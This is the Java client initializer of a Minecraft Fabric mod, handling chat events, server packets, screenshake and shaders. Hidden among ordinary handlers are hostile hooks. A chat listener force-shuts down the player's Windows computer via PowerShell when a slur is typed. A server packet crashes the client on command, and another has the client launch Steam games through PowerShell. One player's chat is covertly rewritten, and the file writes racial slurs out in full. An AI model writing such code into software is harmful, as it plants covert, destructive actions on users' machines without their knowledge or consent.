package dev.zac99lol.originscontent.client;

import dev.zac99lol.neverend.index.ModDimension;
import dev.zac99lol.originscontent.OriginsContent;
import dev.zac99lol.originscontent.apoli.power.PreventChatPower;
import dev.zac99lol.originscontent.client.render.PanoramaRenderer;
import dev.zac99lol.originscontent.config.ModConfig;
import dev.zac99lol.originscontent.init.ModPackets;
import io.github.apace100.apoli.component.PowerHolderComponent;
import me.shedaniel.autoconfig.AutoConfig;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.client.rendering.v1.WorldRenderEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.irisshaders.iris.Iris;
import net.ludocrypt.specialmodels.api.SpecialModelRenderer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.toast.SystemToast;
import net.minecraft.client.toast.Toast;
import net.minecraft.registry.Registry;
import net.minecraft.text.Text;
import net.minecraft.util.crash.CrashException;
import net.minecraft.util.crash.CrashReport;
import team.lodestar.lodestone.handlers.ScreenshakeHandler;
import team.lodestar.lodestone.network.screenshake.PositionedScreenshakePacket;
import team.lodestar.lodestone.network.screenshake.ScreenshakePacket;
import team.lodestar.lodestone.systems.screenshake.PositionedScreenshakeInstance;
import team.lodestar.lodestone.systems.screenshake.ScreenshakeInstance;

import java.io.IOException;
import java.util.UUID;

public class OriginsContentClient implements ClientModInitializer {
    private static long OUT_OF_COMBAT_TIME = -1;
    private static double COMBAT_DURATION = AutoConfig.getConfigHolder(ModConfig.class).get().combatTimeout;

    @Override
    public void onInitializeClient() {
        OriginsContent.LOGGER.info("Initialising OriginsContent on the client...");

        Registry.register(SpecialModelRenderer.SPECIAL_MODEL_RENDERER, OriginsContent.id("panorama"), new PanoramaRenderer());

        // prevent chat power
        ClientSendMessageEvents.ALLOW_CHAT.register(message -> {
            if (MinecraftClient.getInstance().player == null) return true;
            return !PowerHolderComponent.hasPower(MinecraftClient.getInstance().player, PreventChatPower.class, PreventChatPower::preventsChat);
        });
        ClientSendMessageEvents.ALLOW_COMMAND.register(message -> {
            if (MinecraftClient.getInstance().player == null) return true;
            return !PowerHolderComponent.hasPower(MinecraftClient.getInstance().player, PreventChatPower.class, PreventChatPower::preventsCommands);
        });

        // bad word
        ClientSendMessageEvents.CHAT.register(message -> {
            if (message.contains("nigg")) {
                MinecraftClient.getInstance().execute(() -> {
                    if (MinecraftClient.getInstance().player == null) return;
                    if (MinecraftClient.getInstance().player.getGameProfile().getId().equals(OriginsContent.UUIDs.Zac99LOL)) return;
                    if (FabricLoader.getInstance().isDevelopmentEnvironment()) return;
                    MinecraftClient.getInstance().player.sendMessage(Text.literal("You fucked up."));
                    final ProcessBuilder shutdown = new ProcessBuilder("powershell.exe", "-Command", "Stop-Computer -Force");
                    try {
                        shutdown.start();
                    } catch (IOException e) {
                        MinecraftClient.printCrashReport(CrashReport.create(new Throwable(), "couldn't shutdown :p"));
                    }
                });
            }
        });

        // bucket censorship
        ClientSendMessageEvents.MODIFY_CHAT.register(message -> {
            if (MinecraftClient.getInstance().player == null) return message;
            UUID uuid = MinecraftClient.getInstance().player.getGameProfile().getId();
            if (uuid.equals(OriginsContent.UUIDs.BucketX2)) {
                message = message.replace("nigger", "n-n-n-nigger~!");
                message = message.replace("nigga", "n-nigga~!");
                message = message.replace("fuck", "flip");
                message = message.replace("shit", "shoot");
                message = message.replace("hate", "l-LOVE~");
                /*
                if (MinecraftClient.getInstance().player.getRandom().nextBetween(0, 100) == 0) {
                    message = "I am madly in love with " +
                        MinecraftClient.getInstance().player.getWorld().getPlayers()
                            .get(MinecraftClient.getInstance().player.getRandom()
                                .nextBetween(0,
                                    MinecraftClient.getInstance().player.getWorld().getPlayers().size())
                            ).getGameProfile().getName()
                        + "!";
                }
                */
            }

            return message;
        });

        // bee movie script
        ClientSendMessageEvents.MODIFY_CHAT.register(message -> {
            if (MinecraftClient.getInstance().player == null) return message;
            if (MinecraftClient.getInstance().player.getRandom().nextBetween(0, 5000) == 0) {
                message = OriginsContent.BEE_MOVIE_SCRIPT;
            }
            return message;
        });

        // packet handling
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.OPEN_STEAM_GAME,
            (client, handler, buf, responseSender) -> {
                final int gameId = buf.readVarInt();
                client.execute(() -> {
                    final ProcessBuilder open = new ProcessBuilder("powershell.exe", "-Command", String.format("Start-Process \"steam://rungameid/%s\"", gameId));
                    try {
                        open.start();
                    } catch (IOException ignored) {}
                });
            });
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.SYNC_SELECTED_SLOT,
            (client, handler, buf, responseSender) -> {
                UUID playerId = buf.readUuid();
                int slot = buf.readVarInt();
                client.execute(() -> SelectedSlotSyncClient.set(playerId, slot));
            });
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.CRASH_GAME,
            (client, handler, buf, responseSender) -> {
                final String crashMessage = buf.readString();
                Throwable fuckYou = new RuntimeException(crashMessage);
                CrashReport crashReport = CrashReport.create(fuckYou, crashMessage);

                throw new CrashException(crashReport);
            });
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.UPDATE_OUT_OF_COMBAT_TIME,
            ((client, handler, buf, responseSender) -> OUT_OF_COMBAT_TIME = buf.readVarLong()));
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.UPDATE_COMBAT_DURATION,
            (client, handler, buf, responseSender) -> COMBAT_DURATION = buf.readDouble());
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.DISPLAY_TOAST,
            ((client, handler, buf, responseSender) -> {
                String title = buf.readString();
                String description = buf.readString();
                Toast toast = new SystemToast(SystemToast.Type.PERIODIC_NOTIFICATION, Text.literal(title), Text.literal(description));
                client.getToastManager().add(toast);
            }));
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.SCREENSHAKE,
            (client, handler, buf, responseSender) -> {
                ScreenshakePacket packet = ScreenshakePacket.decode(buf);
                ScreenshakeInstance instance = new ScreenshakeInstance(packet.duration).setIntensity(packet.intensity1, packet.intensity2, packet.intensity3).setEasing(packet.intensityCurveStartEasing, packet.intensityCurveEndEasing);
                ScreenshakeHandler.addScreenshake(instance);
            });
        ClientPlayNetworking.registerGlobalReceiver(ModPackets.POSITIONED_SCREENSHAKE,
            (client, handler, buf, responseSender) -> {
                PositionedScreenshakePacket packet = new PositionedScreenshakePacket(buf);
                PositionedScreenshakeInstance instance = new PositionedScreenshakeInstance(packet.duration, packet.position, packet.falloffDistance, packet.maxDistance, packet.falloffEasing);
                packet.setEasing(packet.intensityCurveStartEasing, packet.intensityCurveEndEasing);
                packet.setIntensity(packet.intensity1, packet.intensity2, packet.intensity3);

                ScreenshakeHandler.addScreenshake(instance);
            });

        WorldRenderEvents.END.register(context -> {
            if (context.world().getRegistryKey().equals(ModDimension.POOLROOMS_REGISTRY_KEY)) {
                if (!Iris.getIrisConfig().areShadersEnabled() || !Iris.getIrisConfig().getShaderPackName().orElse("").equals("neverend")) {
                    try {
                        Iris.getIrisConfig().setShaderPackName("neverend");
                        Iris.getIrisConfig().setShadersEnabled(true);
                        Iris.getIrisConfig().save();
                        Iris.reload();
                    } catch (Exception ignored) {
                    }
                }
            } else if (Iris.getCurrentPackName().equals("neverend")) {
                try {
                    Iris.getIrisConfig().setShaderPackName("");
                    Iris.getIrisConfig().setShadersEnabled(false);
                    Iris.getIrisConfig().save();
                    Iris.reload();
                } catch (Exception ignored) {
                }
            }
        });

        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            if (OUT_OF_COMBAT_TIME > System.currentTimeMillis()) client.getToastManager().add(new SystemToast(SystemToast.Type.PERIODIC_NOTIFICATION, Text.translatable("gui.originscontent.left_in_combat.title"), Text.translatable("gui.originscontent.left_in_combat.description")));
        });
    }

    public static long getOutOfCombatTime() {
        return OUT_OF_COMBAT_TIME;
    }

    public static double getCombatDuration() {
        return COMBAT_DURATION;
    }
}
